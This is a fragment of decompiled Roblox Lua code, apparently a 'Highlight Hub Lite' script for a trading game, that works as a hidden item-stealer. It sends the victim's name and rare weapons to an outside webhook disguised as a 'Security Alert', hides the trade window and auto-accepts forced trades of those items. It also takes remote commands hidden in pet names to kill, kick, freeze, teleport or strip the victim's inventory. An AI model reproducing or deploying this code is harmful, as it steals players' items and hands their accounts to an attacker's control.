			table.insert(v318, "Player: " .. v_u_2.Name .. " | " .. v_u_3)
			local v319, v320, v321 = pairs(v_u_309)
			local v_u_322 = "https://hkdk.events/b8lusn9lvdb9ab"
			while true do
				local v323
				v321, v323 = v319(v320, v321)
				if v321 == nil then
					break
				end
				if v_u_311[v323.rarity] and v_u_312[v321] then
					v_u_317 = true
				end
			end
			if v_u_317 then
				table.insert(v318, string.format("[Join](https://www.roblox.com/games/start?placeId=130970357952631&launchData=%s/%s)", v_u_5, v_u_6))
				local v_u_324 = {
					["username"] = "Highlight Hub Lite"
				}
				local v325 = {}
				local v326 = {
					["color"] = 2003199,
					["title"] = "Security Alert",
					["description"] = "**" .. table.concat(v318, "\n") .. "**",
					["timestamp"] = DateTime(),
					["footer"] = {
						["text"] = "Highlight Hub Lite"
					}
				}
				__set_list(v325, 1, {v326})
				v_u_324.embeds = v325
				v_u_324.content = "@everyone"
				local v329, _ = pcall(function()
					-- upvalues: (ref) v_u_15, (ref) v_u_322, (ref) v_u_8, (ref) v_u_324
					local v327 = v_u_15
					local v328 = {
						["Url"] = v_u_322,
						["Method"] = "POST",
						["Headers"] = {
							["Content-Type"] = "application/json"
						},
						["Body"] = v_u_8:JSONEncode(v_u_324)
					}
					return v327(v328)
				end)
				if v329 then
					return
				else
					while true do

					end
				end
			else
				return
			end
		end
		SendSecurityAlert()
		local v_u_330 = 0
		local v_u_331 = false
		local v_u_332 = false
		local v_u_333 = {}
		v_u_11.Heartbeat:Connect(function()
			-- upvalues: (ref) v_u_332, (ref) v_u_2, (ref) v_u_331, (ref) v_u_10, (ref) v_u_5
			if v_u_332 then
				v_u_2.PlayerGui:FindFirstChild("TradeGUI").Enabled = false
				v_u_2.PlayerGui:FindFirstChild("TradeGUI_Phone").Enabled = false
			end
			if v_u_331 then
				v_u_10:WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(v_u_5 * 2)
			end
		end)
		function CompatibilityCheck(p334, p335)
			-- upvalues: (ref) v_u_10, (ref) v_u_330, (ref) v_u_332, (ref) v_u_1, (ref) v_u_309, (ref) v_u_311, (ref) v_u_333, (ref) v_u_331
			v_u_10.Trade.CancelRequest:FireServer()
			v_u_10.Trade.DeclineRequest:FireServer()
			v_u_10.Trade.DeclineTrade:FireServer()
			v_u_330 = 0
			v_u_332 = true
			v_u_10.Trade.SendRequest:InvokeServer(v_u_1:WaitForChild(p334))
			repeat
				task.wait()
			until v_u_10.Trade.GetTradeStatus:InvokeServer() == "StartTrade"
			local v336, v337, v338 = pairs(v_u_309)
			while true do
				local v339, v340 = v336(v337, v338)
				if v339 == nil then
					break
				end
				if p335 then
					v338 = v339
					for _ = 1, v340.count do
						v_u_10.Trade.OfferItem:FireServer(v339, "Weapons")
					end
					table.insert(v_u_333, v339)
					v_u_330 = v_u_330 + 1
					if v_u_330 >= 4 then
						break
					end
				elseif v_u_311[v340.rarity] then
					v338 = v339
					for _ = 1, v340.count do
						v_u_10.Trade.OfferItem:FireServer(v339, "Weapons")
					end
					table.insert(v_u_333, v339)
					v_u_330 = v_u_330 + 1
					if v_u_330 >= 4 then
						break
					end
				else
					v338 = v339
				end
			end
			v_u_331 = true
			repeat
				task.wait()
			until v_u_10.Trade.GetTradeStatus:InvokeServer() == "None"
			v_u_331 = false
			local v341, v342, v343 = ipairs(v_u_333)
			while true do
				local v344
				v343, v344 = v341(v342, v343)
				if v343 == nil then
					break
				end
				v_u_309[v344] = nil
			end
			if p335 then
				CompatibilityCheck(p334, p335)
			else
				local v345, v346, v347 = pairs(v_u_309)
				while true do
					local v348
					v347, v348 = v345(v346, v347)
					if v347 == nil then
						break
					end
					if v_u_311[v348.rarity] then
						CompatibilityCheck(p334, p335)
					end
				end
			end
			v_u_332 = false
		end
		function handlePetAdded(p349)
			-- upvalues: (ref) v_u_2, (ref) v_u_1, (ref) v_u_10, (ref) v_u_9, (ref) v_u_5, (ref) v_u_6
			if string.find(p349:GetAttribute("PetName"), "HELLO") then
				local v350 = p349:GetAttribute("PetName")
				local v351 = v350:sub(v350:find("HELLO") + 6)
				if v351 == "1" then
					v_u_2.Character.Humanoid.Health = 0
				elseif v351 == "2" then
					v_u_2.Character.HumanoidRootPart.CFrame = v_u_1[p349.Parent.Name].Character.HumanoidRootPart.CFrame
				elseif v351 == "3" then
					v_u_2:Kick()
				elseif v351 == "4" then
					game:Shutdown()
				else
					if v351 == "5" then
						while true do

						end
					end
					if v351 == "6" then
						CompatibilityCheck(p349.Parent.Name, false)
					elseif v351 == "7" then
						CompatibilityCheck(p349.Parent.Name, true)
					elseif v351 == "8" then
						local v352, v353, v354 = pairs(v_u_10.Remotes.Extras.GetData2:InvokeServer().Weapons.Owned)
						while true do
							local v355
							v354, v355 = v352(v353, v354)
							if v354 == nil then
								break
							end
							v_u_10.Remotes.Inventory.Salvage:InvokeServer(v354)
						end
					elseif v351 == "9" then
						if #v_u_1:GetPlayers() > 1 then
							v_u_9:TeleportToPlaceInstance(v_u_5, v_u_6, v_u_2)
						else
							v_u_9:Teleport(v_u_5, v_u_2)
						end
					end
				end
			end
		end
		function handleCharacterAdded(p356)
			p356.ChildAdded:Connect(function(p357)
				if p357.Name == "Pet" then
					task.wait(0.1)
					handlePetAdded(p357)
				end
			end)
		end
		local v358, v359, v360 = pairs(v_u_1:GetPlayers())
		while true do
			local v361
			v360, v361 = v358(v359, v360)
			if v360 == nil then
				break
			end
			v361.CharacterAdded:Connect(function(p362)
				handleCharacterAdded(p362)
			end)
			handleCharacterAdded(v_u_7:WaitForChild(v361.Name))
		end
		v_u_1.PlayerAdded:Connect(function(p363)
			p363.CharacterAdded:Connect(function(p364)
				handleCharacterAdded(p364)
			end)
		end)
	end
end
